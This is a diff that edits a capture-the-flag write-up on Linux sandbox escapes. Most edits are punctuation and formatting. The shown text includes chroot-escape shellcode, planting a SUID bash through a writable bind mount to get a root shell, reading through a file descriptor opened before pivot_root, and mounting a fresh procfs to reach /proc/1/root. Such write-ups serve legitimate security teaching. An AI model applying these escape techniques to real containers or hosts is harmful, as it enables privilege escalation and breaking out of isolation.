@@ -1666,23 +1666,23 @@ context.os = "linux"
 context.log_level = "error"
 
 shellcode_asm = """
-    /* mkdir("escape", 0777) — create a subdirectory inside the jail to chroot into */
+    /* mkdir("escape", 0777), create a subdirectory inside the jail to chroot into */
     lea rdi, [rip + escape]
     mov rsi, 0x1ff
     mov rax, 83
     syscall
 
-    /* chroot("escape") — re-root into subdirectory; CWD is now outside the new root */
+    /* chroot("escape"), re-root into subdirectory; CWD is now outside the new root */
     lea rdi, [rip + escape]
     mov rax, 161
     syscall
 
-    /* chdir("../../../../../../../../") — walk up the real filesystem past the jail */
+    /* chdir("../../../../../../../../"), walk up the real filesystem past the jail */
     lea rdi, [rip + dotdots]
     mov rax, 80
     syscall
 
-    /* chroot(".") — re-root at CWD, which is now the real filesystem root */
+    /* chroot("."), re-root at CWD, which is now the real filesystem root */
     lea rdi, [rip + dot]
     mov rax, 161
     syscall
@@ -1693,7 +1693,7 @@ shellcode_asm = """
     mov rax, 2
     syscall
 
-    /* sendfile(stdout, flag_fd, NULL, 0x100) — write flag to stdout */
+    /* sendfile(stdout, flag_fd, NULL, 0x100), write flag to stdout */
     mov rdi, 1
     mov rsi, rax
     xor rdx, rdx
@@ -3554,7 +3554,7 @@ unshare(CLONE_NEWNS)
 # ---- snip ----
 ```
 
-It then creates a temporary jail directory, bind-mounts it over itself so it becomes a proper mount point, creates an `old` subdirectory inside it, and calls `pivot_root`:
+It then creates a temporary jail directory `/tmp/jail-XXXXXX`, bind-mounts it over itself so it becomes a proper mount point, creates an `old` subdirectory inside it, and calls `pivot_root`:
 
 ```c
 # ---- snip ----
@@ -3568,7 +3568,7 @@ syscall(SYS_pivot_root, new_root, old_root)
 # ---- snip ----
 ```
 
-After this, `/` points to the new jail, and the previous real root filesystem is placed at `/old`.
+After this, `/` points to the new jail `/tmp/jail-XXXXXX`, and the previous real root filesystem is placed at `/tmp/jail-XXXXXX/old`, i.e. `/old` .
 The challenge then bind-mounts `/old/bin`, `/old/usr`, `/old/lib`, and `/old/lib64` into the jail so that bash can run correctly inside it.
 
 Finally, a fake flag is written:
@@ -3606,10 +3606,6 @@ Since neither of these is called, the entire original filesystem remains reachab
 ### Exploit
 
 Since we are given a shell directly, the solve is trivial.
-
-```bash
-cat /old/flag
-```
 
 ```python title="~/script.py" showLineNumbers
 from pwn import *
@@ -3761,7 +3757,7 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-This level fixes the previous mistake — the old root is now properly detached after the pivot:
+This level fixes the previous mistake, the old root is now properly detached after the pivot:
 
 ```c
 # ---- snip ----
@@ -3806,7 +3802,7 @@ We abuse the writable bind mount to plant a SUID bash binary into the real host'
 
 **Step 1** - From inside the jail, copy bash and set the SUID bit on it:
 
-```python
+```python title="~/script.py" showLineNumbers
 from pwn import *
 
 context.log_level = "error"
@@ -3832,7 +3828,8 @@ Since `/bin` is bind-mounted from the real host, `/bin/bashsuid` now exists on t
 hacker@sandboxing~mount-cleanup:~$ /bin/bashsuid -p
 ```
 
-This drops us into a root shell on the real host. Then:
+This drops us into a root shell on the real host. 
+Then:
 
 ```
 bashsuid-5.0# cat /flag
@@ -4121,11 +4118,11 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-This level is a clean jail — the old root is properly detached, no bind mounts, no `/proc` left behind. The mount side is airtight.
+This level is a clean jail, the old root is properly detached, no bind mounts, no `/proc` left behind. The mount side is airtight.
 
 But two new things are introduced.
 
-**First**, a file is opened before the jail is set up:
+First, a file is opened before the jail is set up:
 
 ```c
 assert(strstr(argv[1], "flag") == NULL);
@@ -4133,9 +4130,9 @@ assert(strstr(argv[1], "flag") == NULL);
 int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
 ```
 
-The file is opened on the real host filesystem **before** `pivot_root` happens. File descriptors survive mount namespace changes — the FD remains valid and still points to the real file even after the pivot.
+The file is opened on the real host filesystem **before** `pivot_root` happens. File descriptors survive mount namespace changes, the FD remains valid and still points to the real file even after the pivot.
 
-**Second**, shellcode execution is provided inside the jail:
+Second, shellcode execution is provided inside the jail:
 
 ```c
 void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
@@ -4145,14 +4142,14 @@ read(0, shellcode, 0x1000);
 
 There are two guards on the open call:
 
-- `strstr(argv[1], "flag")` — blocks any path containing the string `"flag"`
-- `O_NOFOLLOW` — blocks opening a file if the final path component is a symlink
+- `strstr(argv[1], "flag")`: blocks any path containing the string `"flag"`
+- `O_NOFOLLOW`: blocks opening a file if the final path component is a symlink
 
-The key insight is that `strstr` only checks `argv[1]` — it has no visibility into what the shellcode does at runtime. And `O_NOFOLLOW` only blocks the final component being a symlink.
+The key insight is that `strstr` only checks `argv[1]`: it has no visibility into what the shellcode does at runtime. And `O_NOFOLLOW` only blocks the final component being a symlink.
 
 We can pass `/` as `argv[1]`. It contains no `"flag"`, it is not a symlink, and `O_NOFOLLOW` won't block it. FD `3` is now a direct reference to the real host's `/` opened **before** the pivot.
 
-Inside the shellcode, we call `openat(3, "flag", O_RDONLY)`. The string `"flag"` is embedded in the shellcode binary — `strstr` never sees it. `openat` resolves `"flag"` relative to FD `3`, which points to the real host `/`, giving us the real flag.
+Inside the shellcode, we call `openat(3, "flag", O_RDONLY)`. The string `"flag"` is embedded in the shellcode binary, `strstr` never sees it. `openat` resolves `"flag"` relative to FD `3`, which points to the real host `/`, giving us the real flag.
 
 ### Exploit
 
@@ -4481,7 +4478,7 @@ assert(strstr(argv[1], "fd") == NULL);
 # ---- snip ----
 ```
 
-And if it's not `/home/hacker`, it must be a leaf directory — no subdirectories, checked with `lstat` so symlinks in the path don't fool it.
+And if it's not `/home/hacker`, it must be a leaf directory, no subdirectories, checked with `lstat` so symlinks in the path don't fool it.
 
 But `/home/hacker` is explicitly allowed with no restrictions:
 
@@ -4493,7 +4490,7 @@ if (strstr(argv[1], "home")) assert(strcmp("/home/hacker", argv[1]) == 0);
 # ---- snip ----
 ```
 
-The jail is otherwise clean — old root detached, no `/proc`, no leftover bind mounts.
+The jail is otherwise clean, old root detached, no `/proc`, no leftover bind mounts.
 
 The shellcode runs as root inside the jail with no seccomp restrictions. There is nothing stopping us from calling `mount` directly from the shellcode.
 
@@ -4505,7 +4502,7 @@ mount("proc", "/proc", "proc", 0, NULL)
 
 A freshly mounted `procfs` exposes the kernel's live view of all processes on the host system, including PID 1. `/proc/1/root` is a symlink to the root filesystem of PID 1, which runs on the real host outside the jail.
 
-So the escape is — from shellcode, create `/proc`, mount a fresh `procfs` on it, then read `/proc/1/root/flag`.
+So the escape is, from shellcode, create `/proc`, mount a fresh `procfs` on it, then read `/proc/1/root/flag`.
 
 ### Exploit
 
